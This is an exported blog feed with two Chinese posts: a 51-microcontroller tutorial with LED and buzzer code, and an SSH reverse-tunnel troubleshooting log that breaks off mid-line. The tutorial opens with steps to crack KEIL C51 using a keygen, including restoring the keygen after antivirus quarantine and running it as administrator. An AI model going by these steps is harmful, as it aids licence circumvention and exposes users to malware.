<h4 id="KEIL-C51-软件破解"><a href="#KEIL-C51-软件破解" class="headerlink" title="KEIL C51 软件破解"></a>KEIL C51 软件破解</h4><p>上一节我们已经安装好了 KEIL C51 编程软件，可以使用它来编译51 单片机一些代码量小于 2K 的工程。但是有时候我们开发的项目可能比较大，程序代码超过了 2K，编译后会报错，因此就需要破解 KEIL C51。下面就来介绍下如何破解。 </p>
<p>（1）首先打开 KEIL C51 软件，点击 File&#x2F;License Management,复制红色框 3 中的 CID。 操作步骤如下：</p>
<p><img src="/2022/07/28/%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E5%92%8C%E5%AD%A6%E4%B9%A0/image-20220728231058888.png" alt="image-20220728231058888"></p>
<p><img src="/2022/07/28/%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E5%92%8C%E5%AD%A6%E4%B9%A0/image-20220728235716845.png" alt="image-20220728235716845"></p>
<p>然后我们打开之前下载的 KEIL C51 软件包，里面还有一个keygen 压缩文件，该压缩文件内含有 keygen_new2032.exe 文件，此文件用于破解。因此需要解压，解压后电脑会误认为该文件为病毒文件，会隔离掉，因此我们需要在弹出病毒隔离窗口时点击找回文件即可。</p>
<p>以管理员模式打开此破解软件 keygen_new2032.exe，将刚才从KEIL C51中复制的 CID 码粘贴到下面红色框 4 中，并且在红色框 5 选择C51，然后点击红色框 6，生成破解码，将此破解码即红色框 7 内容复制到KEIL C51 软件内LIC框中，点击 Add LIC 即可破解，如果破解成功则会显示。操作步骤如下：</p>
<p><img src="/2022/07/28/%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E5%92%8C%E5%AD%A6%E4%B9%A0/image-20220729002023233.png" alt="image-20220729002023233"></p>
<p><img src="/2022/07/28/%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E5%92%8C%E5%AD%A6%E4%B9%A0/image-20220729003425413.png" alt="image-20220729003425413"></p>
<p>如 果 破 解 失 败 ， 请 确 认 是 否 使 用 管 理 员 模 式打开KEIL C51 软件和keygen_new2032.exe 破解工具。管理员模式打开方式：选择右键：RunAsAdministrator ,中文系统应该是“以管理员权限运行”，然后就可以正常加licence 了。建议所有用户，都以管理员身份运行，以避免重复破解。至此，我们就将 KEIL C51 软件安装和破解成功。后面就可以使用该软件来编写我们的 51 单片机程序。</p>
<h3 id="实验课程-创建模板"><a href="#实验课程-创建模板" class="headerlink" title="实验课程_创建模板"></a>实验课程_创建模板</h3><h3 id="实验课程-使用PZ-ISP"><a href="#实验课程-使用PZ-ISP" class="headerlink" title="实验课程_使用PZ-ISP"></a>实验课程_使用PZ-ISP</h3><p><strong>如果我们使用的是STC89C516RD+的处理器，选择带RC的芯片类型，也就是说带RD的就选择带RC的芯片类型，如果不带RD的处理器选择不带RC的芯片类型</strong></p>
<p><img src="/2022/07/28/%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E5%92%8C%E5%AD%A6%E4%B9%A0/image-20230419163408643.png" alt="image-20230419163408643"></p>
<h3 id="实验课程-点亮LED灯"><a href="#实验课程-点亮LED灯" class="headerlink" title="实验课程_点亮LED灯"></a>实验课程_点亮LED灯</h3><h4 id="点亮一个LED-D1"><a href="#点亮一个LED-D1" class="headerlink" title="点亮一个LED_D1"></a>点亮一个LED_D1</h4><p>LED灯的端口有四组，分别是P0,P1,P2,P3</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;reg52.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">sbit LED1 = P2^<span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	LED1 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="点亮一个LED-D1-闪烁"><a href="#点亮一个LED-D1-闪烁" class="headerlink" title="点亮一个LED_D1_闪烁"></a>点亮一个LED_D1_闪烁</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;reg52.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> u16;	<span class="comment">//使用typedef来为用户自定义的数据类型取一个新的名字</span></span><br><span class="line">sbit LED1 = P2^<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delay_10us</span><span class="params">(u16 ten_us)</span>     <span class="comment">//当传2入ten_us=1时，大约延时10us</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">while</span>(ten_us--);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	LED1 = <span class="number">0</span>;	<span class="comment">//点亮</span></span><br><span class="line">	delay_10us(<span class="number">50000</span>);<span class="comment">//大约450ms</span></span><br><span class="line">	LED1 = <span class="number">1</span>;	<span class="comment">//熄灭    </span></span><br><span class="line">	delay_10us(<span class="number">50000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="点亮一个LED-D1-流水灯"><a href="#点亮一个LED-D1-流水灯" class="headerlink" title="点亮一个LED_D1_流水灯"></a>点亮一个LED_D1_流水灯</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;reg52.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LED_PORT P2		<span class="comment">//使用宏定义将P2端口定义	</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> u8;	</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> u16;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delay_10us</span><span class="params">(u16 ten_us)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">while</span>(ten_us--);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	u8 i =<span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			LED_PORT=~(<span class="number">0x01</span>&lt;&lt;i);</span><br><span class="line">			delay_10us(<span class="number">50000</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="点亮一个LED-D1-库函数实现-流水灯"><a href="#点亮一个LED-D1-库函数实现-流水灯" class="headerlink" title="点亮一个LED_D1_库函数实现_流水灯"></a>点亮一个LED_D1_库函数实现_流水灯</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;reg52.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;intrins.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LED_PORT P2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> u8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> u16;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delay_10us</span><span class="params">(u16 ten_us)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">while</span>(ten_us--);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	u8 i =<span class="number">0</span>;</span><br><span class="line">	LED_PORT=~<span class="number">0x01</span>;</span><br><span class="line">	delay_10us(<span class="number">50000</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			LED_PORT=_crol_(LED_PORT,<span class="number">1</span>);</span><br><span class="line">			delay_10us(<span class="number">50000</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			LED_PORT=_cror_(LED_PORT,<span class="number">1</span>);</span><br><span class="line">			delay_10us(<span class="number">50000</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="02实验课程-蜂鸣器"><a href="#02实验课程-蜂鸣器" class="headerlink" title="02实验课程_蜂鸣器"></a>02实验课程_蜂鸣器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;reg52.h&gt;</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">typedef unsigned char u8;	</span><br><span class="line">typedef unsigned int u16;</span><br><span class="line"></span><br><span class="line">sbit BEEP=P2^5;</span><br><span class="line"></span><br><span class="line">void delay_10us(u16 ten_us)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">while</span>(ten_us--);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;	</span><br><span class="line">	u16 i =2000; //蜂鸣器发声时间</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">while</span>(1)</span><br><span class="line">	&#123;</span><br><span class="line">		  <span class="keyword">while</span>(i--)</span><br><span class="line">		  &#123;</span><br><span class="line">		  BEEP=!BEEP;</span><br><span class="line">		  delay_10us(100);</span><br><span class="line"></span><br><span class="line">//		  BEEP=0;</span><br><span class="line">//		  delay_10us(50);</span><br><span class="line">//		  BEEP=1;</span><br><span class="line">//		  delay_10us(150);</span><br><span class="line">		  &#125;</span><br><span class="line">		  i = 0;</span><br><span class="line">		  BEEP = 0;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="03实验课程-数码管"><a href="#03实验课程-数码管" class="headerlink" title="03实验课程_数码管"></a>03实验课程_数码管</h3>]]></content>
      <categories>
        <category>娱乐单片机</category>
      </categories>
      <tags>
        <tag>单片机</tag>
        <tag>51</tag>
      </tags>
  </entry>
  <entry>
    <title>ssh反向代理</title>
    <url>/2022/08/09/ssh%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="ssh反代问题"><a href="#ssh反代问题" class="headerlink" title="ssh反代问题"></a>ssh反代问题</h1><h2 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h2><p> 问题一.我有A和B两台服务器，一台在学校ip是<code>10.71.10.25</code>,另外一台在印度ip是<code>124.156.xx.xx</code>，现在我想构建ssh反向代理，让我的服务器A能被外网ssh连接，防止我不在校园也能控制服务器A。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务器A设置</span></span><br><span class="line">root@raspbian:/configuration/script<span class="comment"># vim ssh_reverse_proxy.sh </span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">ssh -fN -R 8101:localhost:22 root@124.156.xx.xx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 监控程序脚本</span></span><br><span class="line">root@raspbian:/configuration/script<span class="comment"># vim ssh_reverse_proxy_daemon.sh </span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>;<span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">	Flag=`ps -ef | grep <span class="string">&quot;8101&quot;</span> | grep -v <span class="string">&quot;grep&quot;</span>`</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$Flag</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">&quot;restart ssh server&quot;</span> </span><br><span class="line">		bash /configuration/script/ssh_reverse_proxy.sh</span><br><span class="line">		<span class="comment"># ssh -fN -R 8101:localhost:22 root@124.156.xx.xx</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">sleep</span> 100</span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加入reboot开机自启计划</span></span><br><span class="line">root@raspbian:/configuration/script<span class="comment"># crontab -e</span></span><br><span class="line">@reboot /configuration/script/ssh_reverse_proxy.sh</span><br><span class="line">@reboot /configuration/script/ssh_reverse_proxy_daemon.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 两台服务器相互交换公钥到对方的/.ssh/authorized_keys，并且把自己的公钥加入到自己的/.ssh/authorized_keys</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>服务器互联目前不需要密码</strong><br><strong>脚本程序一切正常，但是服务器A只有重启后的几分钟内能够用服务器B连接，时间长点的话，比如：30分钟后，会发现服务器B一直连接不上</strong></p>
<p><strong>附图(一下三种情况都是在A服务器发出脚本，并且正常运行的到的)：</strong></p>
<h3 id="情况一：-连得上"><a href="#情况一：-连得上" class="headerlink" title="情况一：(连得上)"></a><strong>情况一：(连得上)</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">服务器A</span><br><span class="line">root@raspbian:/configuration/script<span class="comment"># ps -ef | grep 8101 | grep -v &quot;grep&quot;</span></span><br><span class="line">root     21390     1  0 11:27 ?        00:00:00 ssh -fN -R 8101:localhost:22 root@124.156.xx.xx</span><br><span class="line"></span><br><span class="line">服务器B</span><br><span class="line">[root@VM-0-17-centos ~]<span class="comment"># ip a</span></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 52:54:00:46:11:0d brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.0.17/20 brd 10.0.15.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5054:ff:fe46:110d/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@VM-0-17-centos ~]<span class="comment"># ssh localhost -p 8101</span></span><br><span class="line">Linux raspbian 5.10.78-Release-OPENFANS+20211111-v8 <span class="comment">#1 SMP PREEMPT Thu Nov 11 15:43:52 CST 2021 aarch64</span></span><br><span class="line"></span><br><span class="line">This system Debian Pi Aarch64 <span class="keyword">for</span> Raspberry Pi 3B/3B+/3A+/4B,</span><br><span class="line">Created by OPENFANS.ORG &amp; PIFAN.ORG .</span><br><span class="line"></span><br><span class="line">Your can visit our official site:</span><br><span class="line">http://www.openfans.org &amp; http://www.pifan.org</span><br><span class="line"></span><br><span class="line">Project address:</span><br><span class="line">https://github.com/openfans-community-offical/Debian-Pi-Aarch64</span><br><span class="line"></span><br><span class="line">It is strictly prohibited <span class="keyword">for</span> any commercial use</span><br><span class="line">without permission!</span><br><span class="line"></span><br><span class="line">Especially some disgusting Taobao merchants,</span><br><span class="line">congratulations to being warned!</span><br><span class="line"></span><br><span class="line">Activate the web console with: systemctl <span class="built_in">enable</span> --now cockpit.socket</span><br><span class="line"></span><br><span class="line">You have new mail.</span><br><span class="line">Last login: Tue May 31 11:10:02 2022 from 10.71.5.50</span><br><span class="line"></span><br><span class="line">   .~~.   .~~.         ___                __                      ___  _ </span><br><span class="line">   <span class="string">&#x27;. \ &#x27;</span> <span class="string">&#x27; / .&#x27;</span>      / _ \___  ___ ___  / /  ___  ___ ___ _ __  / _ \(_)</span><br><span class="line">    .~ .~~~..~.      / , _/ _ `(_-&lt;/ _ \/ _ \/ -_) __/ __/ // / / ___/ / </span><br><span class="line">   : .~.<span class="string">&#x27;~&#x27;</span>.~. :    /_/|_|\_,_/___/ .__/_.__/\__/_/ /_/  \_, / /_/  /_/  </span><br><span class="line">  ~ (   ) (   ) ~                /_/                    /___/          </span><br><span class="line"> ( : <span class="string">&#x27;~&#x27;</span>.~.<span class="string">&#x27;~&#x27;</span> : )  </span><br><span class="line">  ~ .~ (   ) ~. ~     Copyright (c) 2017-2022, OPENFANS.ORG &amp; PIFAN.ORG</span><br><span class="line">   (  : <span class="string">&#x27;~&#x27;</span> :  )      Linux Version 5.10.78-Release-OPENFANS+2021111</span><br><span class="line">    <span class="string">&#x27;~ .~~~. ~&#x27;</span>       Compiled <span class="comment">#1 SMP PREEMPT Thu Nov 11 15:43:52 CST 2021</span></span><br><span class="line">        <span class="string">&#x27;~&#x27;</span>           Four ARM  Processors, 7.9GB RAM</span><br><span class="line">                      432.00 Bogomips Total</span><br><span class="line">root@raspbian:~<span class="comment"># ip a</span></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether e4:5f:01:3d:b7:4f brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.71.10.159/24 brd 10.71.10.255 scope global dynamic noprefixroute eth0</span><br><span class="line">       valid_lft 133302sec preferred_lft 133302sec</span><br><span class="line">    inet6 fe80::c2b7:8023:6697:581f/64 scope <span class="built_in">link</span> noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: wlan0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc fq state DOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether e4:5f:01:3d:b7:50 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">4: macvlan@eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 1a:55:9c:25:a7:5b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.71.10.25/24 brd 10.71.10.255 scope global macvlan</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::1855:9cff:fe25:a75b/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">5: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    <span class="built_in">link</span>/ether 02:42:5b:34:04:4f brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:5bff:fe34:44f/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">6: br-6f69248df895: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default </span><br><span class="line">    <span class="built_in">link</span>/ether 02:42:f3:c1:54:d1 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-6f69248df895</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">9: vetha11c56c@if8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default </span><br><span class="line">    <span class="built_in">link</span>/ether 42:0f:dc:8a:33:57 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet6 fe80::400f:dcff:fe8a:3357/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="comment"># 已经连上</span></span><br></pre></td></tr></table></figure>



<h3 id="情况二：-连不上，但是一直尝试连接，没有报错"><a href="#情况二：-连不上，但是一直尝试连接，没有报错" class="headerlink" title="情况二：(连不上，但是一直尝试连接，没有报错)"></a><strong>情况二：(连不上，但是一直尝试连接，没有报错)</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM-0-17-centos ~]<span class="comment"># ssh localhost -p 8101</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">^C</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/09/ssh%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/image-20220531113156680.png" alt="image-20220531113156680"></p>
<h3 id="情况三：-直接连接不上，服务器B发出连接不了报错"><a href="#情况三：-直接连接不上，服务器B发出连接不了报错" class="headerlink" title="情况三：(直接连接不上，服务器B发出连接不了报错)"></a><strong>情况三：(直接连接不上，服务器B发出连接不了报错)</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务器B</span></span><br><span class="line">[root@VM-0-17-centos ~]<span class="comment"># ssh localhost -p 8101</span></span><br><span class="line">ssh_exchange_identification: <span class="built_in">read</span>: Connection reset by peer</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/09/ssh%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/image-20220531113218786.png" alt="image-20220531113218786"></p>
<h3 id="现在状态"><a href="#现在状态" class="headerlink" title="现在状态"></a>现在状态</h3><p><code>截至时间2022-6-17中午12：52分，服务器A重启后，服务器B也没办法连接上</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">服务器A的crontab日志信息如下</span><br><span class="line">root@raspbian:~<span class="comment"># cat /var/log/cron.log</span></span><br><span class="line">Jun 17 00:05:01 raspbian CRON[15444]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 00:15:01 raspbian CRON[16476]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 00:17:01 raspbian CRON[16674]: (root) CMD (   <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly)</span><br><span class="line">Jun 17 00:20:01 raspbian CRON[16978]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 00:25:01 raspbian CRON[17516]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 00:35:01 raspbian CRON[18539]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 00:40:01 raspbian CRON[19040]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 00:45:01 raspbian CRON[19582]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 00:55:01 raspbian CRON[20582]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 01:00:01 raspbian CRON[21079]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 01:05:01 raspbian CRON[21620]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 01:15:01 raspbian CRON[22651]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 01:17:01 raspbian CRON[22848]: (root) CMD (   <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly)</span><br><span class="line">Jun 17 01:20:01 raspbian CRON[23155]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 01:25:01 raspbian CRON[23693]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 01:35:01 raspbian CRON[24713]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 01:40:01 raspbian CRON[25215]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 01:45:01 raspbian CRON[25754]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 01:55:01 raspbian CRON[26772]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 02:00:01 raspbian CRON[27260]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 02:05:01 raspbian CRON[27812]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 02:15:01 raspbian CRON[28827]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 02:17:01 raspbian CRON[29025]: (root) CMD (   <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly)</span><br><span class="line">Jun 17 02:20:01 raspbian CRON[29336]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 02:25:01 raspbian CRON[29877]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 02:35:01 raspbian CRON[30899]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 02:40:01 raspbian CRON[31405]: (smmsp) CMD (<span class="built_in">test</span> -x /etc/init.d/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/share/sendmail/sendmail &amp;&amp; <span class="built_in">test</span> -x /usr/lib/sm.bin/sendmail &amp;&amp; /usr/share/sendmail/sendmail cron-msp)</span><br><span class="line">Jun 17 02:45:01 raspbian CRON[31941]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 1)</span><br><span class="line">Jun 17 02:55:01 raspbian CRON[533]: (root) CMD (<span class="built_in">command</span> -v debian-sa1 &gt; /dev/null &amp;&amp; debian-sa1 1 